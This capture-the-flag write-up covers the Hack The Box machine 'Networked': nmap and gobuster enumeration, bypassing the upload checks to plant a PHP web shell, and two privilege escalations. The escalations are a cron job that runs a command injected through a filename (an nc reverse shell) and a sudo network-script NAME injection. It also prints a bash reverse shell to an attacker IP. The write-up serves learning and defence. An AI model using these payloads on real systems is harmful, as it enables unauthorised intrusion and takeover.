# Networked Writeup w/o Metasploit

![](https://miro.medium.com/max/579/1*XeX7LkiBHJjLCyF7ITRECw.png)

## Reconnaissance <a id="e44c"></a>

Run the [nmapAutomator](https://github.com/21y4d/nmapAutomator) script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.146 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.146
                                                                                               
Host is likely running Linux---------------------Starting Nmap Quick Scan---------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-12 09:52 EST
Nmap scan report for 10.10.10.146
Host is up (0.032s latency).
Not shown: 997 filtered ports, 1 closed port
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 5.31 seconds---------------------Starting Nmap Basic Scan---------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-12 09:52 EST
Nmap scan report for 10.10.10.146
Host is up (0.029s latency).PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.20 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-12 09:53 EST
Warning: 10.10.10.146 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.146
Host is up (0.035s latency).
All 1000 scanned ports on 10.10.10.146 are open|filtered (949) or filtered (51)Nmap done: 1 IP address (1 host up) scanned in 46.05 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-12 09:53 EST
.....
Nmap scan report for 10.10.10.146
Host is up (0.042s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
443/tcp closed httpsRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 370.20 seconds
           Raw packets sent: 130978 (5.763MB) | Rcvd: 233 (16.688KB)No new ports---------------------Starting Nmap Vulns Scan---------------------
                                                                                               
Running CVE scan on basic ports
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-12 09:59 EST
Nmap scan report for 10.10.10.146
Host is up (0.035s latency).PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
| vulners: 
|   cpe:/a:apache:http_server:2.4.6: 
|_      CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.40 secondsRunning Vuln scan on basic ports
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-12 10:00 EST
Nmap scan report for 10.10.10.146
Host is up (0.033s latency).PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:7.4: 
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|_      CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /backup/: Backup folder w/ directory listing
|   /icons/: Potentially interesting folder w/ directory listing
|_  /uploads/: Potentially interesting folder
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:apache:http_server:2.4.6: 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
.....Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.56 seconds---------------------Recon Recommendations----------------------Web Servers Recon:
                                                                                               
gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.146:80 -o recon/gobuster_10.10.10.146_80.txt
nikto -host 10.10.10.146:80 | tee recon/nikto_10.10.10.146_80.txtWhich commands would you like to run?                                                          
All (Default), gobuster, nikto, Skip <!>Running Default in (1) s:---------------------Running Recon Commands----------------------Starting gobuster scan
                                                                                               
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.146:80
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/01/12 10:01:19 Starting gobuster
===============================================================
http://10.10.10.146:80/.hta (Status: 403) [Size: 206]
http://10.10.10.146:80/.hta.html (Status: 403) [Size: 211]
http://10.10.10.146:80/.hta.php (Status: 403) [Size: 210]
http://10.10.10.146:80/.htpasswd (Status: 403) [Size: 211]
http://10.10.10.146:80/.htpasswd.html (Status: 403) [Size: 216]
http://10.10.10.146:80/.htpasswd.php (Status: 403) [Size: 215]
http://10.10.10.146:80/.htaccess (Status: 403) [Size: 211]
http://10.10.10.146:80/.htaccess.html (Status: 403) [Size: 216]
http://10.10.10.146:80/.htaccess.php (Status: 403) [Size: 215]
http://10.10.10.146:80/backup (Status: 301) [Size: 235]
http://10.10.10.146:80/cgi-bin/ (Status: 403) [Size: 210]
http://10.10.10.146:80/cgi-bin/.html (Status: 403) [Size: 215]
http://10.10.10.146:80/index.php (Status: 200) [Size: 229]
http://10.10.10.146:80/index.php (Status: 200) [Size: 229]
http://10.10.10.146:80/lib.php (Status: 200) [Size: 0]
http://10.10.10.146:80/photos.php (Status: 200) [Size: 1302]
http://10.10.10.146:80/upload.php (Status: 200) [Size: 169]
http://10.10.10.146:80/uploads (Status: 301) [Size: 236]
===============================================================
2020/01/12 10:01:59 Finished
===============================================================Finished gobuster scan
                                                                                               
=========================
                                                                                               
Starting nikto scan
                                                                                               
- Nikto v2.1.6
--------------------------------------------------------------------
+ Target IP:          10.10.10.146
+ Target Hostname:    10.10.10.146
+ Target Port:        80
+ Start Time:         2020-01-12 10:02:00 (GMT-5)
--------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS) PHP/5.4.16
+ Retrieved x-powered-by header: PHP/5.4.16
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.4.16 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3268: /backup/: Directory indexing found.
+ OSVDB-3092: /backup/: This might be interesting...
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8673 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2020-01-12 10:08:14 (GMT-5) (374 seconds)
--------------------------------------------------------------------
+ 1 host(s) testedFinished nikto scan
                                                                                               
=========================
                                                                                                                                                                            
                                                                                               
---------------------Finished all Nmap scans---------------------
```

Before we move on to enumeration, let’s make some mental notes about the scan results. We have 2 open ports:

* **Port 22:** running OpenSSH 7.4
* **Port 80:** running Apache httpd 2.4.6

Let’s look at each port individually.

**Port 22**

* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.

**Port 80**

* The nmap/gobuster/nikto scans on this web server showed several promising directories/files: /backup, /icons, /uploads, index.php, lib.php, photos.php, uploads.php, /icons/README.

## Enumeration <a id="9b54"></a>

Visit the application in the browser.

![](https://miro.medium.com/max/577/1*XrxMSsDJ55SBU2ZahS8XJQ.png)

View page source to see if we get any extra information.

![](https://miro.medium.com/max/496/1*EUoCYnMU4QVrJybfOA8iew.png)

There’s a comment mentioning an upload and gallery pages that have not yet been linked to the index page. We found those pages during the gobuster scan.

Visit the _upload_ page.

![](https://miro.medium.com/max/491/1*qjJYSMXwh5sQ4ZhUxlFRqQ.png)

It gives you the option of uploading files. We’ll have to test what type of files can be uploaded. The web server can run php code, so we’ll have to check if it accepts _.php_ files. Maybe we can upload a php shell on the server.

Next, visit the _photos_ page. It contains a bunch of images. The images that get uploaded on the _upload_ page, are presented on this page.

![](https://miro.medium.com/max/1002/1*hTtJzHkBB0hnpb_R66rUFA.png)

View page source to see the link to each image.

![](https://miro.medium.com/max/850/1*0ZIihOYZmkudPDOJKzorVg.png)

So not only do we have a way of uploading files on the web server, but we can also execute those files. In most cases, restrictions are put in place preventing us from uploading any file. Therefore, we’ll need to first enumerate these restrictions and then figure out a way to bypass them.

Next, view the backup directory. It contains a compressed file.

![](https://miro.medium.com/max/628/1*e-qxp_U5hjLf1Gg3phTxhA.png)

Download the file and decompress it.

```text
tar -C backup/ -xvf backup.tar
```

* **-C:** directory where files will be saved.
* **-xvf:** extract files and list files that have been extracted.

It contains the source code of the php scripts running on the web server. This is great for us, because we can simply look at the php scripts in order to determine the validation that is put in place for uploading files.

## **Initial Foothold** <a id="c527"></a>

Let’s view the _upload.php_ script. It takes in the uploaded file and performs two validation checks on it.

```text
....// First validation check
if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }....// Second validation check
list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }
```

Let’s describe the second validation check first. It takes in an array of allowed file extensions and checks if the uploaded file contains that extension. The check is being performed using the [_substr\_compare\(\)_](https://www.php.net/manual/en/function.substr-compare.php) function. This is a function that is used to compare two strings.

```text
substr_compare ( string $main_str , string $str , int $offset)
```

It requires at least three parameters:

1. **$main\_str:** the main string being compared.
2. **$str:** the secondary string being compared.
3. **$offset:** the start position for the comparison. If negative, it starts counting from the end of the string.

The following is an example.

```text
substr_compare ( test.png , .png, -4)
```

Since the offset in the above example is negative, it starts at the end of the string “test.png” and checks every character with the characters in the string “.png” \(4 characters\). In this case the test would pass and the function outputs a zero. This is exactly what the upload script is doing. Therefore, in order to bypass that, all we have to do is upload a file with a valid extension at the end. For example: test.php.png.

Let’s move on to the first validation check. The script calls the _check\_file\_type\(\)_ function from the _lib.php_ file. This in turn calls the _file\_mime\_type\(\)_ function to determine the mime type of the file. Then the mime type is checked to see if it contains the string ‘image/’ in it.

```text
function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }  
}
```

This can be easily bypassed because we can simply include what is known as [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) in our file in order to trick the script into thinking the file is an image. This can be be done by adding the string “GIF87a” to the file.

Alright, we know how to bypass both validation checks, so we’re ready to run our exploit.

Create a file called _test.php.png_ and add the the following code to it.

```text
GIF87a                                                                                                                                                                         
<?php system($_GET['cmd']); ?>
```

The first line tricks the application into thinking it is an image and the second line adds a parameter to the get request called _cmd_. Upload the file and intercept the request in Burp.

![](https://miro.medium.com/max/694/1*FNs7nj2_FhzuLWTsVvo4ZA.png)

As can be seen, the request identified it as an image. Send the request and visit the _photos_ page.

![](https://miro.medium.com/max/1176/1*R0X7BcN13VvuUWj2v81jLw.png)

We can see that our image has been uploaded. Right click and select _View Image_. This executes our code. Next, add the _cmd_ parameter to the URL and run the _whoami_ command.

![](https://miro.medium.com/max/690/1*ZEnOAi-k21jM9z9VvG1iTw.png)

We have code execution! Now, let’s get a reverse shell. First, set up a listener on the attack machine.

```text
nc -nlvp 1234
```

Then run the _whoami_ request again and send it to _Repeater._ You will have to disable the “File extension” in _Proxy_ &gt; _Options_ &gt; _Intercept Client Requests_ in order to intercept the request.

Next, visit [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and add the bash reverse shell in the ‘_cmd_’ parameter.

```text
bash -c 'bash -i >& /dev/tcp/10.10.14.12/1234 0>&1'
```

Make sure to URL encode it before you send the request \(Ctrl + U\).

![](https://miro.medium.com/max/763/1*l2rqNKH-wB3YvkbElAG34g.png)

We get a shell! Let’s upgrade it to a better shell.

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.

```text
export TERM=xterm
```

Unfortunately, we’re running as the web daemon user _apache_ and we don’t have privileges to view the user.txt flag. Therefore, we need to escalate our privileges.

## Privilege Escalation <a id="eb18"></a>

The _user.txt_ flag is in the home directory of the user _guly_. So we’ll either have to escalate our privileges to _guly_ or _root_.

I ran the _LinEnum.sh_ and _pspy64_ programs but didn’t find anything unusual. I did notice that in the home directory of _guly_ there’s a php script and a crontab file. We have read permission on both of them.

```text
bash-4.2$ ls -la
total 28
drwxr-xr-x. 2 guly guly 159 Jul  9  2019 .
drwxr-xr-x. 3 root root  18 Jul  2  2019 ..
lrwxrwxrwx. 1 root root   9 Jul  2  2019 .bash_history -> /dev/null
-rw-r--r--. 1 guly guly  18 Oct 30  2018 .bash_logout
-rw-r--r--. 1 guly guly 193 Oct 30  2018 .bash_profile
-rw-r--r--. 1 guly guly 231 Oct 30  2018 .bashrc
-rw-------  1 guly guly 639 Jul  9  2019 .viminfo
-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
-r--------. 1 guly guly  33 Oct 30  2018 user.txt
```

View the content of crontab.guly.

```text
bash-4.2$ cat crontab.guly 
*/3 * * * * php /home/guly/check_attack.php
```

It’s running the _file check\_attack.php_ script every 3 minutes. If you’re not familiar with the crontab format, refer to the following [link](https://www.netiq.com/documentation/cloud-manager-2-5/ncm-reference/data/bexyssf.html).

Let’s view the _check\_attack.php_ file.

```text
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";$files = array();
$files = preg_grep('/^([^.])/', scandir($path));foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";#print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}?>
```

The script is taking in all the files in the /var/www/html/uploads directory and running the _getnameCheck\(\)_ and _check\_ip\(\)_ functions on it from the lib.php file.

```text
function getnameCheck($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  #echo "name $name - ext $ext\n";
  return array($name,$ext);
}function check_ip($prefix,$filename) {
  //echo "prefix: $prefix - fname: $filename<br>\n";
  $ret = true;
  if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {
    $ret = false;
    $msg = "4tt4ck on file ".$filename.": prefix is not a valid ip ";
  } else {
    $msg = $filename;
  }
  return array($ret,$msg);
}
```

The _getnameCheck\(\)_ function simply separates the name of the file from the extension of the file. The _check\_ip\(\)_ function checks if the filename is a valid IP address. If it is not, it will return false which will trigger the attack component in the _check\_attack.php_ file.

```text
if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
```

This passes the path of the file to the exec\(\) function and deletes it. Of course, no validation is being done on the input of the exec\(\) function and so we can abuse it to escalate privileges.

Change to the /var/www/html/uploads directory and create the following file.

```text
touch '; nc -c bash 10.10.14.12 3333'
```

The “;” will end the “rm” command in the exec\(\) function and run the nc command, which will send a reverse shell back to our machine.

Set up a listener to receive the reverse shell.

```text
nc -nlvp 3333
```

Wait for the cron job to run and we get a shell!

![](https://miro.medium.com/max/766/1*OkP1WlM1QKT84lApLyJYSQ.png)

Convert the shell to a fully interactive shell and grab the user.txt flag.

![](https://miro.medium.com/max/451/1*2VJG0HmFnJgPRxZFrriRkA.png)

We need to escalate our privileges to root. I downloaded the _LinEnum_ script and ran it. It looks like we can run the following file as root without a password.

```text
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh[+] Possible sudo pwnage!
/usr/local/sbin/changename.sh
```

View the permissions on the file.

```text
[guly@networked ~]$ ls -la /usr/local/sbin | grep changename.sh
-rwxr-xr-x   1 root root 422 Jul  8  2019 changename.sh
```

We only have read and execute permissions on the file. Let’s view the content of the file.

```text
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoFregexp="^[a-zA-Z0-9_\ /-]+$"for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```

It takes in the content of the file _ifcfg-guly_ and does a simple regex check on the input. Let’s view the permissions on that file.

```text
[guly@networked ~]$ ls -la /etc/sysconfig/network-scripts/ | grep ifcfg-guly
-rw-r--r--  1 root root   114 Jan 14 04:09 ifcfg-guly
```

We can only read it. Let’s view the file.

```text
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
NAME=ps /tmp/foo
PROXY_METHOD=asodih
BROWSER_ONLY=asdoih
BOOTPROTO=asdoih
```

The NAME is assigned a system command, so we can probably use this to escalate privileges. After a bit of googling, I found this [bug report](https://bugzilla.redhat.com/show_bug.cgi?id=1697473) that states that incorrect whitespace filtering on the NAME attribute leads to code execution. Since we can run the changename.sh script with sudo privileges, it will prompt us to enter the NAME value and since it’s not properly validated, we can get a shell with root privileges!

![](https://miro.medium.com/max/866/1*Vmd3WoSA8qufDqIbSHsJVQ.png)

Grab the root.txt flag.

![](https://miro.medium.com/max/648/1*mmvPI8v99qeyDt4tfjHf8A.png)

## Lessons Learned <a id="e363"></a>

To gain an initial foothold on the box we exploited two vulnerabilities.

1. Sensitive Information Disclosure. The backup source code of the application was available for anyone to view. We analyzed the code in order to better understand the defenses that were put in place for file uploads, which eventually helped us bypass the defenses. Any sensitive information should not be publicly disclosed.
2. Insufficient Input Validation. The upload functionality of the website had insufficient validation on the names of uploaded files. Therefore, we were able to upload a malicious file and run the malicious file to give us an initial foothold on the system. Proper input validation checks should be put in place on all user input.

To escalate privileges we exploited two vulnerabilities.

1. Command Injection. A user owned cron job was taking in the filenames of a non-privileged user and running system commands on the filenames. Since insufficient input validation was put in place, we were able to create a file with a file name that contained a command that sent a reverse shell back to our machine. Since the cron job was running with the user _guly’s_ privileges, we were able to escalate our privileges to _guly_. To prevent this vulnerability from occurring, there are [many defenses](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html) that can be put in place, including but not limited to the use of libraries or APIs as an alternative to calling OS commands directly.
2. Sudo Security Misconfiguration. A non-privileged user should not have sudo execute rights on a script that takes in the user’s input to run a privileged task. Since the input was not validated and we were able to run the file with root privileges, we were able to escalate our privileges to _root_. The administrator should have conformed to the principle of least privilege.

